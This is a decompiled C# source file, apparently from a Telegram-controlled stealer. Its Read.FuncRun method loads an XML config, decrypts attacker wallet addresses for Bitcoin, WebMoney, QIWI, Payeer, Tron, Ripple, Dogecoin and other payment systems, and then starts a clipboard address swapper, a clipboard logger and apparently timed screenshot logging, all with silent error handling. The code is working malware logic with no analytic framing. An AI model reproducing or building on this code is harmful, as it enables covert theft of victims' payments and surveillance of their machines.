using System;
using System.Collections;
using System.IO;
using System.Xml;

namespace TelegramBot
{
	// Token: 0x02000013 RID: 19
	internal class Read
	{
		// Token: 0x06000051 RID: 81 RVA: 0x000046D4 File Offset: 0x000028D4
		public static void FuncRun(string path)
		{
			try
			{
				if (File.Exists(Commands.directory + path))
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(Commands.directory + path);
					foreach (object obj in xmlDocument.DocumentElement)
					{
						XmlNode xmlNode = (XmlNode)obj;
						string text = xmlNode.Attributes.GetNamedItem("name").Value;
						if (!(text == "Clp"))
						{
							if (!(text == "Cbl"))
							{
								if (!(text == "Scr"))
								{
									continue;
								}
								goto IL_5DD;
							}
						}
						else
						{
							using (IEnumerator enumerator2 = xmlNode.ChildNodes.GetEnumerator())
							{
								while (enumerator2.MoveNext())
								{
									object obj2 = enumerator2.Current;
									XmlNode xmlNode2 = (XmlNode)obj2;
									text = xmlNode2.Name;
									uint num = <PrivateImplementationDetails>.ComputeStringHash(text);
									if (num <= 1339528032U)
									{
										if (num <= 267207753U)
										{
											if (num != 15543468U)
											{
												if (num != 117021011U)
												{
													if (num == 267207753U)
													{
														if (text == "wmr")
														{
															if (!string.IsNullOrEmpty(xmlNode2.InnerText))
															{
																Purse.wmr = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
															}
														}
													}
												}
												else if (text == "payeer")
												{
													if (!string.IsNullOrEmpty(xmlNode2.InnerText))
													{
														Purse.payeer = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
													}
												}
											}
											else if (text == "wme")
											{
												if (!string.IsNullOrEmpty(xmlNode2.InnerText))
												{
													Purse.wme = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
												}
											}
										}
										else if (num <= 401428705U)
										{
											if (num != 367873467U)
											{
												if (num == 401428705U)
												{
													if (text == "wmz")
													{
														if (!string.IsNullOrEmpty(xmlNode2.InnerText))
														{
															Purse.wmz = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
														}
													}
												}
											}
											else if (text == "wmx")
											{
												if (!string.IsNullOrEmpty(xmlNode2.InnerText))
												{
													Purse.wmx = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
												}
											}
										}
										else if (num != 1113510858U)
										{
											if (num == 1339528032U)
											{
												if (text == "btc")
												{
													if (!string.IsNullOrEmpty(xmlNode2.InnerText))
													{
														Purse.btc = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
													}
												}
											}
										}
										else if (text == "value")
										{
											if (!string.IsNullOrEmpty(xmlNode2.InnerText) && Convert.ToBoolean(xmlNode2.InnerText))
											{
												Commands.Clp = Convert.ToBoolean(xmlNode2.InnerText);
												ClipChanger.StartChanger();
											}
										}
									}
									else if (num <= 1445564707U)
									{
										if (num != 1370004851U)
										{
											if (num != 1385829598U)
											{
												if (num == 1445564707U)
												{
													if (text == "cc")
													{
														if (!string.IsNullOrEmpty(xmlNode2.InnerText))
														{
															Purse.cc = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
														}
													}
												}
											}
											else if (text == "tron")
											{
												if (!string.IsNullOrEmpty(xmlNode2.InnerText))
												{
													Purse.tron = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
												}
											}
										}
										else if (text == "qiwi")
										{
											if (!string.IsNullOrEmpty(xmlNode2.InnerText))
											{
												Purse.qiwi = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
											}
										}
									}
									else if (num <= 1696468759U)
									{
										if (num != 1465887920U)
										{
											if (num == 1696468759U)
											{
												if (text == "ripple")
												{
													if (!string.IsNullOrEmpty(xmlNode2.InnerText))
													{
														Purse.ripple = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
													}
												}
											}
										}
										else if (text == "yd")
										{
											if (!string.IsNullOrEmpty(xmlNode2.InnerText))
											{
												Purse.yd = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
											}
										}
									}
									else if (num != 3076289541U)
									{
										if (num == 3660713261U)
										{
											if (text == "dogechain")
											{
												if (!string.IsNullOrEmpty(xmlNode2.InnerText))
												{
													Purse.dogechain = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
												}
											}
										}
									}
									else if (text == "btcg")
									{
										if (!string.IsNullOrEmpty(xmlNode2.InnerText))
										{
											Purse.btcg = RC4.Decrypt(xmlNode2.InnerText, ClipboardEx.UNICODETEXT);
										}
									}
								}
								continue;
							}
						}
						using (IEnumerator enumerator2 = xmlNode.ChildNodes.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								object obj3 = enumerator2.Current;
								XmlNode xmlNode3 = (XmlNode)obj3;
								if (xmlNode3.Name == "value" && !string.IsNullOrEmpty(xmlNode3.InnerText) && Convert.ToBoolean(xmlNode3.InnerText))
								{
									Commands.Cbl = Convert.ToBoolean(xmlNode3.InnerText);
									ClipChanger.StartLogger();
								}
							}
							continue;
						}
						IL_5DD:
						foreach (object obj4 in xmlNode.ChildNodes)
						{
							XmlNode xmlNode4 = (XmlNode)obj4;
							if (!string.IsNullOrEmpty(xmlNode4.InnerText) && xmlNode4.Name == "value" && Convert.ToBoolean(xmlNode4.InnerText))
							{
								Commands.Scr = Convert.ToBoolean(xmlNode4.InnerText);
								ScrL.perm = Convert.ToBoolean(xmlNode4.InnerText);
								ScrL.Time2Log();
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
